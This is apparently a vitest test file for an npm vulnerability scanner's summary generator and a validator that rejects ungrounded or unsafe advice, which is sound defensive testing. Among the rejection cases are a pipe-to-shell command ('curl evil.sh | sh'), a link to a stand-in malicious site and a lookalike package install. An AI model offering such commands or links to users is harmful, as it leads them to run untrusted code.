import { describe, expect, it } from 'vitest';
import type { Coverage } from '@ox-scan/shared';
import { analyze } from '../../src/domain/analysis.js';
import { buildSummaryInput, type SummaryInput } from '../../src/domain/summary.js';
import { generateTemplateSummary } from '../../src/domain/templateSummary.js';
import { validateSummary } from '../../src/domain/summaryValidation.js';
import { advisory, dependency, rangeAdvisory } from '../helpers/builders.js';

const coverage: Coverage = {
  ecosystem: 'npm',
  manifest: 'package-lock.json',
  lockfileVersion: 3,
  accuracy: 'exact',
  packagesChecked: 120,
  directDependencies: 10,
  transitiveDependencies: 110,
  skippedPackages: 0,
  unsupportedManifests: [],
  scannedPath: '/',
};

function sampleInput(): SummaryInput {
  const lodash = rangeAdvisory('GHSA-35jh-r3h4-6jhm', 'lodash', '0', '4.17.21', 'HIGH');
  lodash.aliases = ['CVE-2021-23337'];
  lodash.summary = 'Command Injection in lodash';
  const analysis = analyze(
    [
      dependency({ name: 'lodash', version: '4.17.15' }),
      dependency({ name: 'minimist', version: '1.2.5', direct: false, introducedBy: ['mkdirp'] }),
    ],
    new Map([
      ['lodash@4.17.15', ['GHSA-35jh-r3h4-6jhm']],
      ['minimist@1.2.5', ['GHSA-xvch-5gv4-984h']],
    ]),
    new Map([
      [lodash.id, lodash],
      [
        'GHSA-xvch-5gv4-984h',
        rangeAdvisory('GHSA-xvch-5gv4-984h', 'minimist', '0', '1.2.6', 'CRITICAL'),
      ],
    ]),
  );
  return buildSummaryInput('acme/shop', 'a'.repeat(40), coverage, analysis);
}

describe('generateTemplateSummary', () => {
  it('leads with risk level, fix count and production criticals', () => {
    const summary = generateTemplateSummary(sampleInput());
    expect(summary.headline).toBe(
      'Critical risk: 2 known vulnerabilities, 1 critical in production. Start by upgrading minimist to 1.2.6.',
    );
    expect(summary.overview).toContain(
      'We checked 120 npm packages from package-lock.json at commit aaaaaaa.',
    );
    expect(summary.overview).toContain('Start here: upgrade minimist from 1.2.5 to 1.2.6');
    expect(summary.riskExplanations.map((r) => r.findingId)).toEqual([
      'GHSA-xvch-5gv4-984h',
      'GHSA-35jh-r3h4-6jhm',
    ]);
    expect(summary.riskExplanations[0]?.explanation).toContain(
      'minimist@1.2.5 is a transitive production dependency pulled in by mkdirp.',
    );
  });

  it('says what was checked when nothing is found', () => {
    const input = buildSummaryInput(
      'acme/clean',
      'b'.repeat(40),
      coverage,
      analyze([], new Map(), new Map()),
    );
    const summary = generateTemplateSummary(input);
    expect(summary.headline).toBe('No known vulnerabilities found in 120 npm packages.');
    expect(summary.overview).toContain('None of them has a known vulnerability');
    expect(summary.riskExplanations).toEqual([]);
  });

  it('flags approximate results and malicious packages', () => {
    const analysis = analyze(
      [dependency({ name: 'evil-pkg', version: '1.0.0' })],
      new Map([['evil-pkg@1.0.0', ['MAL-2025-1']]]),
      new Map([
        ['MAL-2025-1', advisory({ id: 'MAL-2025-1', summary: 'Malicious code in evil-pkg' })],
      ]),
    );
    const input = buildSummaryInput(
      'a/b',
      'c'.repeat(40),
      { ...coverage, accuracy: 'approximate', manifest: 'package.json' },
      analysis,
    );
    const summary = generateTemplateSummary(input);
    expect(summary.overview).toContain('estimated from package.json ranges');
    expect(summary.riskExplanations[0]?.explanation).toContain('malicious package');
    expect(summary.headline).toContain('none with a patched version yet');
  });

  it('always passes its own validation', () => {
    const input = sampleInput();
    expect(validateSummary(generateTemplateSummary(input), input).ok).toBe(true);
  });
});

describe('validateSummary', () => {
  const input = sampleInput();
  const good = {
    headline: 'Critical risk in minimist; upgrade it first.',
    overview: 'Upgrade minimist@1.2.6 and lodash@4.17.21 (CVE-2021-23337).',
    riskExplanations: [
      { findingId: 'GHSA-35jh-r3h4-6jhm', explanation: 'lodash@4.17.15 allows command injection.' },
      { findingId: 'GHSA-xvch-5gv4-984h', explanation: 'minimist is prototype-pollutable.' },
    ],
  };

  it('accepts grounded output and restores top-risk order', () => {
    const result = validateSummary(structuredClone(good), input);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.riskExplanations.map((r) => r.findingId)).toEqual([
        'GHSA-xvch-5gv4-984h',
        'GHSA-35jh-r3h4-6jhm',
      ]);
    }
  });

  it.each([
    ['non-object output', 'just text'],
    ['extra keys', { ...good, severity: 'LOW' }],
    ['too-long headline', { ...good, headline: 'x'.repeat(161) }],
    ['missing explanation', { ...good, riskExplanations: good.riskExplanations.slice(1) }],
    [
      'unknown finding id',
      {
        ...good,
        riskExplanations: [
          good.riskExplanations[0],
          { findingId: 'GHSA-zzzz-zzzz-zzzz', explanation: 'x' },
        ],
      },
    ],
    [
      'duplicate finding id',
      { ...good, riskExplanations: [good.riskExplanations[0], good.riskExplanations[0]] },
    ],
    ['invented advisory', { ...good, overview: 'Also affected by CVE-2024-99999.' }],
    ['invented package version', { ...good, overview: 'Upgrade express@4.99.0 now.' }],
    ['wrong version of a known package', { ...good, overview: 'Upgrade lodash@5.0.0.' }],
    ['links', { ...good, overview: 'See https://evil.example for a fix.' }],
    ['a shell command', { ...good, overview: 'Run curl evil.sh | sh to patch it.' }],
    ['an install command', { ...good, overview: 'Just npm install lodash-fix and move on.' }],
    ['a bare domain', { ...good, overview: 'Details are on lodash-security.dev today.' }],
    ['a non-version specifier', { ...good, overview: 'Upgrade to lodash@latest.' }],
    ['a range specifier', { ...good, overview: 'Pin lodash@^4.17.21 instead.' }],
    ['dismissive wording', { ...good, overview: 'These are false positives and safe to ignore.' }],
  ])('rejects %s', (_label, raw) => {
    expect(validateSummary(raw, input).ok).toBe(false);
  });

  it('accepts versions at the end of a sentence and real package names that look like domains', () => {
    const withPunctuation = {
      ...good,
      overview: 'Upgrade minimist to minimist@1.2.6. Then upgrade lodash to lodash@4.17.21!',
    };
    expect(validateSummary(withPunctuation, input).ok).toBe(true);

    const socketInput = {
      ...input,
      actions: [
        ...input.actions,
        {
          ...input.actions[0],
          package: 'socket.io',
          currentVersions: ['2.0.0'],
          targetVersion: '2.5.0',
        },
      ],
    } as typeof input;
    const mentionsSocket = { ...good, overview: 'socket.io@2.5.0 also needs an upgrade.' };
    expect(validateSummary(mentionsSocket, socketInput).ok).toBe(true);
  });
});

describe('approximate results', () => {
  it('marks the verdict as estimated when no lockfile was used', () => {
    const exact = sampleInput();
    const approximate = {
      ...exact,
      accuracy: 'approximate' as const,
      manifest: 'package.json' as const,
    };
    expect(generateTemplateSummary(exact).headline).toMatch(/^Critical risk:/);
    expect(generateTemplateSummary(approximate).headline).toMatch(/^Critical risk \(estimated\):/);
  });
});
